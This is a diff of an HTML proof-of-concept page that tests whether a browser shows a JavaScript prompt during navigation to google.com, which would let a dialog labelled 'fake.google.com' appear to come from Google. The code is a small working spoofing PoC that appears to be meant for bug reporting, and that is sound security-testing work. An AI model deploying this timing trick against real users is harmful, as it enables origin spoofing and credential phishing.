@@ -2,55 +2,48 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Strong Windows Browser Dialog Timing PoC</title>
+  <title>Origin Confusion – Dialog During Navigation</title>
 </head>
+
 <body style="background:#111;color:#fff;text-align:center;font-family:sans-serif;">
-<h2>Strong Windows Browser Dialog Timing PoC</h2>
+<h2>Origin Confusion PoC (Desktop)</h2>
 
-<button id="start" style="font-size:22px;padding:12px 24px;">Start Test</button>
+<button id="start" style="font-size:22px;padding:12px 24px;">
+Start Test
+</button>
 
-<pre id="log" style="color:#0f0; text-align:left; margin:20px auto; width:90%; max-width:800px;"></pre>
+<pre id="log" style="text-align:left;margin:20px auto;width:90%;max-width:900px;
+background:#000;padding:14px;border-radius:8px;color:#0f0;"></pre>
 
 <script>
-const log = msg => {
-  document.getElementById("log").textContent += msg + "\n";
-  console.log("[PoC]", msg);
+const log = m => {
+  document.getElementById("log").textContent += m + "\n";
+  console.log("[PoC]", m);
 };
 
 document.getElementById("start").onclick = () => {
-  log("[INFO] User gesture received. Preparing PoC...");
+  log("[INFO] User interaction received");
 
-  // 1️⃣ Open a new tab/window (top-level navigation)
-  const navWin = window.open("https://www.google.com", "_blank");
-  log("[INFO] New tab opened: google.com");
+  // Step 1: Trigger top-level navigation
+  setTimeout(() => {
+    log("[INFO] Navigating to google.com");
+    location.href = "https://www.google.com";
+  }, 900);
 
-  // 2️⃣ Inject delayed prompt into new window
+  // Step 2: Dialog during navigation timing window
   setTimeout(() => {
     try {
-      navWin.document.body.innerHTML = '<h1 style="color:red;">Injected PoC</h1>';
-      navWin.prompt(
+      prompt(
         "fake.google.com\n⚠️ Do not sign into your account",
         ""
       );
-      log("[BUG] prompt() shown in new window during navigation ❌");
-    } catch(e) {
-      log("[EXPECTED] prompt blocked: " + e.message + " ✔");
+      log("[BUG] Dialog shown during navigation ❌");
+    } catch (e) {
+      log("[OK] Dialog blocked ✔");
     }
-  }, 150); // small delay to hit navigation timing window
-
-  // 3️⃣ Optional: simulate multiple dialogs in sequence
-  setTimeout(() => {
-    try {
-      navWin.prompt(
-        "Second dialog fake.google.com\n⚠️ Stay alert!",
-        ""
-      );
-      log("[BUG] second prompt shown ❌");
-    } catch(e) {
-      log("[EXPECTED] second prompt blocked ✔");
-    }
-  }, 300);
+  }, 950);
 };
 </script>
 </body>
 </html>
+
